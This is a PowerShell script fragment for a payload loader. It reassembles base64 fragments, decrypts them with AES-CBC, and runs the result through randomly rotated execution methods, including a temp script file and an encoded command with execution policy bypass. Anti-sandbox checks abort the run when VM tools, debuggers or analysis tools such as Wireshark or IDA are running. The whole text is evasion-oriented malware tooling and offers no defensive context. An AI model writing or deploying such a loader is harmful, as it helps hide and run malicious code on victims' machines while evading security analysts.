# LAYER 2: Core Transformation Functions
function Resolve-EncryptionKey {
    param([string]$CipherText)
    
    $DecodeAttempts = @(
        { [System.Convert]::FromBase64String($CipherText) },
        { 
            $bytes = [System.Convert]::FromBase64String($CipherText)
            $bytes[0..($bytes.Length-1)]
        },
        { 
            $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CipherText))
            [System.Text.Encoding]::UTF8.GetBytes($decoded)
        }
    )
    
    foreach ($attempt in $DecodeAttempts) {
        try {
            return & $attempt
        } catch { continue }
    }
    return $null
}

function Assemble-DataMatrix {
    param([string[]]$Fragments)
    
    $byteStream = [System.Collections.Generic.List[byte]]::new()
    foreach ($fragment in $Fragments) {
        $decoded = [System.Convert]::FromBase64String($fragment)
        $byteStream.AddRange($decoded)
    }
    return $byteStream.ToArray()
}

function Process-AESCipher {
    param(
        [byte[]]$DataStream,
        [byte[]]$CipherKey,
        [byte[]]$CipherIV
    )
    
    try {
        # Create AES decryptor
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $CipherKey
        $aes.IV = $CipherIV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        # Create decryptor stream
        $decryptor = $aes.CreateDecryptor()
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        
        # Decrypt data
        $cs.Write($DataStream, 0, $DataStream.Length)
        $cs.FlushFinalBlock()
        $cs.Close()
        
        $decryptedBytes = $ms.ToArray()
        $ms.Close()
        
        $aes.Dispose()
        
        return $decryptedBytes
    } catch {
        Write-Debug "[AES_FAILURE] $_"
        return $null
    }
}

# LAYER 3: Execution Engine with Anti-Debugging
function Invoke-StealthExecution {
    param([string]$ScriptPayload)
    
    # Multiple execution vectors
    $ExecutionVectors = @(
        { param($s) 
            $scriptBlock = [scriptblock]::Create($s)
            & $scriptBlock 
        },
        { param($s)
            $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
            [System.IO.File]::WriteAllText($tempFile, $s)
            & $tempFile
            Remove-Item $tempFile -Force
        },
        { param($s)
            $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
            powershell -EncodedCommand $encoded -NoProfile -ExecutionPolicy Bypass
        }
    )
    
    # Rotate execution methods with more randomness
    $rotationSeed = (Get-Random -Maximum 1000) % $ExecutionVectors.Count
    $selectedVector = $ExecutionVectors[$rotationSeed]
    
    return & $selectedVector $ScriptPayload
}

# LAYER 4: Advanced Validation Functions
function Test-ExecutionEnvironment {
    # Check for debugging/sandbox environments
    $suspiciousProcesses = @("vmsrvc", "vmusrvc", "vbox", "vmware", "procmon", "wireshark", "ida")
    $runningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
    
    foreach ($process in $suspiciousProcesses) {
        if ($runningProcesses -match $process) {
            Write-Debug "[SUSPICIOUS_PROCESS] $process detected"
            return $false
        }
    }
    
    # Check for common sandbox usernames
    $sandboxUsers = @("sandbox", "malware", "test", "user")
    $currentUser = [System.Environment]::UserName.ToLower()
    
    foreach ($user in $sandboxUsers) {
        if ($currentUser -match $user) {
            return $false
        }
    }
    
    return $true
}

# LAYER 5: Main Orchestration Sequence
function Initiate-AESDecryptionSequence {
    # Phase 0: Environment Validation
    if (-not (Test-ExecutionEnvironment)) {
        Write-Debug "[ENVIRONMENT_FAILURE] Suspicious environment detected"
        return $null
    }
    
    # Phase 1: Material Reconstruction
    Write-Verbose "[+] Assembling AES cipher matrix..."
    $CipherStream = Assemble-DataMatrix -Fragments $CipherMatrix
    
    Write-Verbose "[+] Resolving AES encryption key..."
    $DecryptionKey = Resolve-EncryptionKey -CipherText $KeyCipher
    $DecryptionIV = Resolve-EncryptionKey -CipherText $IVCipher
    
    if (-not $DecryptionKey -or -not $DecryptionIV) {
        throw "Failed to resolve AES encryption parameters"
    }
    
    # Phase 2: AES Decryption
    Write-Verbose "[+] Processing AES-CBC cipher stream..."
    $DecryptedBytes = Process-AESCipher -DataStream $CipherStream `
                                         -CipherKey $DecryptionKey `
                                         -CipherIV $DecryptionIV
    
    if (-not $DecryptedBytes) {
        throw "AES decryption process failed"
    }
    
    # Phase 3: Payload Reconstruction with validation
    Write-Verbose "[+] Reconstructing payload..."
    $DecryptedScript = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    
    # Validate decrypted content
    if ($DecryptedScript -notmatch "%P%|powershell|script|execut") {
        Write-Debug "[VALIDATION_FAILURE] Decrypted content appears invalid"
        return $null
    }
    
    return $DecryptedScript
}

